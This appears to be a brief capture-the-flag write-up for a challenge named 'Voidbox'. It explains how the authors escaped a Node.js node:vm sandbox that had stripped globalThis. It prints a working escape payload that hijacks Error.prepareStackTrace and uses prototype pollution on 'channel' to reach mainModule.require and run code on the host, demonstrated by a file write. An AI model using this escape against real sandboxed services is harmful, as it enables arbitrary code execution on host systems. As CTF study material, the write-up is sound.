### Voidbox

Our solution to the challenge was to escape from the `node:vm` sandbox and then use Prototype Pollution to bypass the removal of all properties in `globalThis` 
done by the following snippet:

```js
for (const key in Object.getOwnPropertyDescriptors(𝓰𝓵𝓸𝓫𝓪𝓵𝓣𝓱𝓲𝓼)) {
  try {
    delete 𝓰𝓵𝓸𝓫𝓪𝓵𝓣𝓱𝓲𝓼[key];
  } catch {}
}
```

Our exploit executed inside the sandbox was as the following:

```js
),Error.prepareStackTrace = new Proxy(() => {},{apply(a,b,c){
c.constructor.constructor(`
[].__proto__.__proto__.__defineGetter__('channel',function() {
this.mainModule.require('fs').writeFileSync('/tmp/asd3.txt', 'asd')
})
`)();
}
})
async function a() {
 eval("1=1")
 }
a();
"ASD"//
```

Which polluted `channel` on the host and thanks to which we got access to `this.mainModule` allowing us to execute arbitrary code.
